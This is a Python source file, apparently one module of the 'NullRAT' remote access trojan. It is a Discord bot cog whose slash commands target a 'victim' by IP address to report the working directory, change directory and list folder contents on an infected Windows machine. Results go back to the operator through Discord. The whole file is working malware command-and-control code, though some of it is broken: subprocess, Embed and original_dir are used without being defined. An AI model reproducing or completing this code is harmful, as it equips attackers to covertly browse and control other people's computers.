import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class DirectoryCommands(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Returns Current Working Directory",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
        ]
    )
    async def get_workingdir(self, ctx, victim):
        if str(victim) == str(self.ip_addr):
            await ctx.response.send_message(
                embed=self.bot.genEmbed(
                    "Current directory of NullRAT:", 
                    datetime.now(), 
                    os.getcwd()
                )
            )

    @commands.slash_command(
        description="Change directory to specified location",
        options=[
            discord.Option("victim", description="IP Address of specific victim", required=True),
            discord.Option("directory", description="New directory where NullRAT will CD", required=True),
        ]
    )
    async def change_directory(self, ctx, victim, directory):
        if str(victim) == str(self.ip_addr):
            try:
                os.chdir(directory)
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Successfully changed directory", 
                        datetime.now(), 
                        f"New directory:\n```{os.getcwd()}```"
                    )
                )
            except FileNotFoundError:
                await ctx.response.send_message(embed=self.bot.genEmbed( "Directory not found!", datetime.now() ))

    @commands.slash_command(description="Finds contents of directory")
    async def list_directory(self, ctx, victim, directory_to_find="null"):
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            if directory_to_find == "null":
                directory_to_find = os.getcwd()
                subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            else:
                try: os.chdir(directory_to_find)
                except: return await ctx.followup.send(embed=Embed(title="Invalid directory! Please try again :)"))
                subprocess.run(f'dir > "{nr_working}\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            file = discord.File(
                os.path.join(nr_working + "\\dir.txt"), filename="Directory.txt"
            )
            embed=discord.Embed(title="Contents of directory are:", description=directory_to_find)
            await ctx.followup.send(embed=embed, file=file)
            os.remove(nr_working + "\\dir.txt")
            os.chdir(original_dir)

def setup(bot: commands.Bot):
    bot.add_cog(DirectoryCommands(bot))